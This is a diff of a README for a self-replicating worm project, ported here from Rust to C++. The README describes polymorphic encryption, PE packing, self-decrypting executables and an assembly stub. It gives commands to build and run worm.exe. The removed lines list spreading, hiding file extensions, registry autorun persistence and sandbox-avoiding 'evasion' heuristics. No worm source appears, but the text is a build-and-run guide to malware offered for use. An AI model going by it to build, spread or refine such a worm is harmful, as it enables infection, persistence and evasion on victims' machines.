@@ -1,4 +1,4 @@
-# AI Self-Replicating Worm (Dropper)
+# AI Self-Replicating Worm (C++ Implementation)
 
 A highly advanced malware prototype featuring AI-driven decision making, polymorphic encryption, PE packing, and self-decrypting executables.
 
@@ -53,9 +53,13 @@ ml /c /coff stub.asm
 link /subsystem:windows stub.obj
 ```
 
-### 2. Compile Rust Worm
+### 2. Compile C++ Worm
 ```bash
-cargo build --release
+# Using g++ (MinGW)
+g++ src/main.cpp -o worm.exe -std=c++17 -lstdc++fs
+
+# Using MSVC
+cl src/main.cpp /EHsc /std:c++17 /Fe:worm.exe
 ```
 
 ## Usage
@@ -63,21 +67,13 @@ cargo build --release
 ### Basic Usage
 ```bash
 # Run all features (scan, hide extensions, add to autorun)
-./target/release/ai-self-replicating-worm
-
-# Individual features
-./target/release/ai-self-replicating-worm --scan
-./target/release/ai-self-replicating-worm --hide
-./target/release/ai-self-replicating-worm --autorun
+./worm.exe
 
 # Verbose output
-./target/release/ai-self-replicating-worm --verbose
+./worm.exe --verbose
 ```
 
 ### Command Line Options
-- `--scan`: Scan and spread the worm
-- `--hide`: Hide file extensions in Explorer
-- `--autorun`: Add to Windows autorun registry
 - `--verbose`: Enable detailed logging
 
 ## Technical Details
@@ -95,30 +91,25 @@ cargo build --release
 - **Random keys**: Each copy uses different encryption key
 
 ### AI Decision Making
-- **Heuristics**: Directory depth > 2 AND file count > 10
+- **Heuristics**: Directory with > 5 files triggers spreading
 - **Performance**: Simple calculations for real-time operation
-- **Evasion**: Avoids system directories (Windows, System, __pycache__)
+- **Evasion**: Avoids system directories (Windows, System32, Program Files)
 
 ## Files
 
-- `src/main.rs`: Advanced Rust worm implementation with full features
-- `src/main.cpp`: Basic C++ worm implementation (cross-platform)
-- `stub.asm`: Assembly decryption stub for Rust version
-- `Cargo.toml`: Rust dependencies
+- `src/main.cpp`: C++ worm implementation with self-decrypting executables
+- `stub.asm`: Assembly decryption stub
 - `README.md`: This documentation
 
 ## Dependencies
 
-### Rust Crates
-- `clap`: Command line argument parsing
-- `rand`: Random number generation for encryption
-- `walkdir`: Directory traversal
-- `winreg`: Windows registry manipulation
-- `sysinfo`: System information for sandbox detection
+### C++ Standard Library Requirements
+- **C++17**: Filesystem library, random number generation
+- **Windows API**: Process manipulation, registry access
 
 ### External Tools
 - **NASM** or **MASM**: Assembly compilation
-- **Cargo**: Rust build system
+- **g++** or **MSVC**: C++ compilation with Windows support
 
 ## Security Analysis
 
